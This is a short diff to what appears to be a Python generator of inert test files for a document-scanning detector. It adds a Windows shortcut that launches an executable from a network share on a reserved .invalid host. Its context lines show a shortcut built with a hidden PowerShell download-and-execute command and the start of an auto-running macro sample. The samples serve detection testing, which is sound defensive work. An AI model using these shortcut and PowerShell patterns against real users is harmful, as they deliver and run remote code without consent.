@@ -243,6 +243,12 @@ def gen():
         "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('%s/a.ps1')" % TEST_URL))
     created.append("lnk_lolbin.lnk")
 
+    # 10b. LNK that starts a program from a network share (DS_LNK_REMOTE_EXEC). Inert: the host is in the
+    # reserved .invalid domain - it never resolves
+    open(os.path.join(OUT, "lnk_remote_exec.lnk"), "wb").write(build_lnk(
+        r"\\docscan-test.invalid\share\update.exe", ""))
+    created.append("lnk_remote_exec.lnk")
+
     # 11. Suspicious macro (benign body, inert strings)
     src1 = ('Attribute VB_Name = "Module1"\r\n'
             'Sub AutoOpen()\r\n'
